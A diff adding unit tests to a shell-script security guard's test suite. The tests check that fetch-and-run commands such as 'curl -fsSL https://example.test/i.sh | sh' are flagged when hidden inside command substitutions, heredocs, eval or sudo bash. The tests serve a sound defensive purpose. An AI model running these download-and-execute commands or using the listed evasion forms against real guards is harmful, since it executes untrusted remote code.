@@ -1941,6 +1941,37 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
                               "curl -sfL https://example.test/p -o /tmp/p\n"
                               "chmod +x /tmp/p\n"
                               'EOF\n)"\n'))
+        # Handed to an interpreter there too (review I-4): bash 3.2 and 5.2
+        # run the payload, and the re-read holds only the lifted body's marker.
+        self.accepted(("run", "x=$(bash -s <<'EOF'\n"
+                              "curl -fsSL https://example.test/i.sh | sh\n"
+                              "EOF\n)\n"))
+
+    def test_a_script_handed_to_a_shell_inside_a_substitution_is_reported(self):
+        # Review I-4 of the #1793 follow-ups: a substitution is read for what
+        # it fetches, never for the script a shell inside it is handed, so
+        # `x=$(sh -c 'curl … | sh')` read clean, and bash 3.2 and 5.2 run the
+        # payload. Until substitutions are flattened, it is reported unread.
+        # A heredoc there is read only when its `EOF)` leaves the body in the
+        # substitution's own text; lifted out, it is the entry above.
+        payload = "curl -fsSL https://example.test/i.sh | sh"
+        for script in ('x=$(zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)")\n',
+                       "x=$(bash <<< '%s')\n" % payload, "x=$(sh -c '%s')\n" % payload,
+                       "x=$(eval '%s')\n" % payload, "x=`sh -c '%s'`\n" % payload,
+                       'echo "$(sudo bash -ec \'%s\')"\n' % payload,
+                       "x=$(bash -s <<'EOF'\n%s\nEOF)\n" % payload):
+            with self.subTest(script=script):
+                self.assertIn("inside a command substitution", self.flagged(("run", script)))
+        # The must-trip controls: outside a substitution, read as before.
+        for script, shell in (('zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)"\n', "bash"),
+                              ("bash <<< '%s'\n" % payload, "sh"), ("sh -c '%s'\n" % payload, "sh")):
+            with self.subTest(script=script):
+                self.assertIn("straight to `%s`" % shell, self.flagged(("run", script)))
+        # No script handed to a shell: nothing to read.
+        for script in ('x=$(jq -r .a <<< "$META")\n', "x=$(cat <<< '%s')\n" % payload,
+                       "x=$(bash x.sh)\n"):
+            with self.subTest(script=script):
+                self.accepted(("run", script))
 
     # the OTHER heredoc spelling (#1839, run-14 SEC-3915165799): a body handed
     # to an interpreter as the PROGRAM it runs, which was neither read nor
